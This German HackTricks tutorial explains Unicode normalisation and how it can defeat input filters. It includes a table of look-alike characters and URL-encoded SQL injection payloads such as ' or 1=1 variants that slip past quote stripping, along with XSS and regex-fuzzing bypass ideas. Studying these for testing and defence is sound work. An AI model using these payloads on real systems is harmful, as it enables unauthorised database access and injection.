# Unicode Normalisierung

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Dies ist eine Zusammenfassung von:** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/). Schau dir weitere Details an (Bilder dort entnommen).

## Verst√§ndnis von Unicode und Normalisierung

Unicode-Normalisierung ist ein Prozess, der sicherstellt, dass verschiedene bin√§re Darstellungen von Zeichen auf denselben bin√§ren Wert standardisiert werden. Dieser Prozess ist entscheidend im Umgang mit Zeichenfolgen in der Programmierung und Datenverarbeitung. Der Unicode-Standard definiert zwei Arten von Zeichen√§quivalenz:

1. **Kanonische √Ñquivalenz**: Zeichen gelten als kanonisch √§quivalent, wenn sie beim Drucken oder Anzeigen dasselbe Aussehen und dieselbe Bedeutung haben.
2. **Kompatibilit√§ts√§quivalenz**: Eine schw√§chere Form der √Ñquivalenz, bei der Zeichen dasselbe abstrakte Zeichen darstellen k√∂nnen, aber unterschiedlich angezeigt werden k√∂nnen.

Es gibt **vier Unicode-Normalisierungsalgorithmen**: NFC, NFD, NFKC und NFKD. Jeder Algorithmus verwendet kanonische und kompatible Normalisierungstechniken unterschiedlich. F√ºr ein tieferes Verst√§ndnis kannst du diese Techniken auf [Unicode.org](https://unicode.org/) erkunden.

### Wichtige Punkte zur Unicode-Codierung

Das Verst√§ndnis der Unicode-Codierung ist entscheidend, insbesondere im Umgang mit Interoperabilit√§tsproblemen zwischen verschiedenen Systemen oder Sprachen. Hier sind die Hauptpunkte:

* **Codepunkte und Zeichen**: In Unicode wird jedem Zeichen oder Symbol ein numerischer Wert zugewiesen, der als "Codepunkt" bekannt ist.
* **Byte-Darstellung**: Der Codepunkt (oder das Zeichen) wird im Speicher durch ein oder mehrere Bytes dargestellt. Zum Beispiel werden LATIN-1-Zeichen (h√§ufig in englischsprachigen L√§ndern) mit einem Byte dargestellt. Sprachen mit einem gr√∂√üeren Zeichensatz ben√∂tigen jedoch mehr Bytes zur Darstellung.
* **Codierung**: Dieser Begriff bezieht sich darauf, wie Zeichen in eine Reihe von Bytes umgewandelt werden. UTF-8 ist ein verbreiteter Codierungsstandard, bei dem ASCII-Zeichen mit einem Byte und bis zu vier Bytes f√ºr andere Zeichen dargestellt werden.
* **Datenverarbeitung**: Systeme, die Daten verarbeiten, m√ºssen sich der verwendeten Codierung bewusst sein, um den Byte-Stream korrekt in Zeichen umzuwandeln.
* **Varianten von UTF**: Neben UTF-8 gibt es andere Codierungsstandards wie UTF-16 (mit mindestens 2 Bytes, bis zu 4) und UTF-32 (mit 4 Bytes f√ºr alle Zeichen).

Es ist entscheidend, diese Konzepte zu verstehen, um potenzielle Probleme, die aus der Komplexit√§t von Unicode und seinen verschiedenen Codierungsmethoden entstehen, effektiv zu handhaben und zu mindern.

Ein Beispiel daf√ºr, wie Unicode zwei verschiedene Bytes normalisiert, die dasselbe Zeichen darstellen:
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Eine Liste von Unicode-√Ñquivalentzeichen finden Sie hier:** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) und [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### Entdecken

Wenn Sie in einer Webanwendung einen Wert finden, der zur√ºckgegeben wird, k√∂nnten Sie versuchen, **‚ÄòKELVIN SIGN‚Äô (U+0212A)** zu senden, das **normalisiert zu "K"** (Sie k√∂nnen es als `%e2%84%aa` senden). **Wenn ein "K" zur√ºckgegeben wird**, dann wird eine Art von **Unicode-Normalisierung** durchgef√ºhrt.

Ein weiteres **Beispiel**: `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` nach **Unicode** ist `Leonishan`.

## **Anf√§llige Beispiele**

### **SQL Injection Filter umgehen**

Stellen Sie sich eine Webseite vor, die das Zeichen `'` verwendet, um SQL-Abfragen mit Benutzereingaben zu erstellen. Diese Webseite l√∂scht als Sicherheitsma√ünahme alle Vorkommen des Zeichens **`'`** aus der Benutzereingabe, aber **nach dieser L√∂schung** und **vor der Erstellung** der Abfrage, **normalisiert** sie die Eingabe des Benutzers mit **Unicode**.

Dann k√∂nnte ein b√∂swilliger Benutzer ein anderes Unicode-Zeichen, das √§quivalent zu `' (0x27)` ist, wie `%ef%bc%87` einf√ºgen. Wenn die Eingabe normalisiert wird, entsteht ein einfaches Anf√ºhrungszeichen und eine **SQLInjection-Schwachstelle** tritt auf:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (702).png>)

**Einige interessante Unicode-Zeichen**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### sqlmap-Vorlage

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS (Cross Site Scripting)

Sie k√∂nnten eines der folgenden Zeichen verwenden, um die Webanwendung zu t√§uschen und eine XSS auszunutzen:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (2).png>)

Beachten Sie, dass das erste vorgeschlagene Unicode-Zeichen beispielsweise als: `%e2%89%ae` oder als `%u226e` gesendet werden kann.

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1) (1).png>)

### Fuzzing Regexes

Wenn das Backend **Benutzereingaben mit einem Regex √ºberpr√ºft**, k√∂nnte es m√∂glich sein, dass die **Eingabe** f√ºr den **Regex** **normalisiert** wird, aber **nicht** f√ºr den Ort, an dem sie **verwendet** wird. Zum Beispiel k√∂nnte der Regex in einem Open Redirect oder SSRF die gesendete **URL** **normalisieren**, aber dann **so verwenden, wie sie ist**.

Das Tool [**recollapse**](https://github.com/0xacb/recollapse) \*\*\*\* erm√∂glicht es, **Variationen der Eingabe zu generieren**, um das Backend zu fuzzern. F√ºr weitere Informationen √ºberpr√ºfen Sie das **github** und diesen [**Beitrag**](https://0xacb.com/2022/11/21/recollapse/).

## Referenzen

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks unterst√ºtzen</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
